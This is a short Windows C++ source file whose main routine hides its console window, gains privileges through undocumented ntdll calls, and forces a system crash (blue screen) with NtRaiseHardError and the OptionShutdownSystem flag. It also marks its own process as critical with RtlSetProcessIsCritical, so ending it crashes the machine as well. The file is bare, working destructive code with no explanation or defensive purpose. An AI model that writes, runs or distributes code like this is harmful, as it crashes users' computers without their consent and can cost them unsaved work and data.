#include "RaiseHardError.h"
#include "SetProcessIsCritical.h"

int RaiseHardError() {
    auto hNtdll = LoadLibraryA("ntdll.dll");
    if (hNtdll == nullptr) {
        FreeLibrary(hNtdll);
        return ERROR_BAD_ENVIRONMENT;
    }

    auto RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege) GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    BOOLEAN enabled;
    if (RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &enabled) != 0) {
        FreeLibrary(hNtdll);
        return ERROR_ACCESS_DENIED;
    }

    auto NtRaiseHardError = (pdef_NtRaiseHardError) GetProcAddress(hNtdll, "NtRaiseHardError");
    auto ZwRaiseHardError = (pdef_ZwRaiseHardError) GetProcAddress(hNtdll, "ZwRaiseHardError");
    FreeLibrary(hNtdll);
    HARDERROR_RESPONSE Response;
    NtRaiseHardError(Error_Status, 0, nullptr, nullptr, OptionShutdownSystem, &Response);
    ZwRaiseHardError(Error_Status, 0, nullptr, nullptr, OptionShutdownSystem, &Response);
    return Response;
}

int SetCriticalProcess() {
    auto hNtdll = LoadLibraryA("ntdll.dll");
    if (hNtdll == nullptr) {
        FreeLibrary(hNtdll);
        return ERROR_BAD_ENVIRONMENT;
    }

    auto RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege) GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    BOOLEAN enabled;
    if (RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &enabled) != 0) {
        FreeLibrary(hNtdll);
        return ERROR_ACCESS_DENIED;
    }

    auto RtlSetProcessIsCritical = (pdef_RtlSetProcessIsCritical) GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
    FreeLibrary(hNtdll);
    BOOLEAN OldValue;
    return RtlSetProcessIsCritical(TRUE, &OldValue, FALSE);
}

int main() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    RaiseHardError();
    SetCriticalProcess();
}

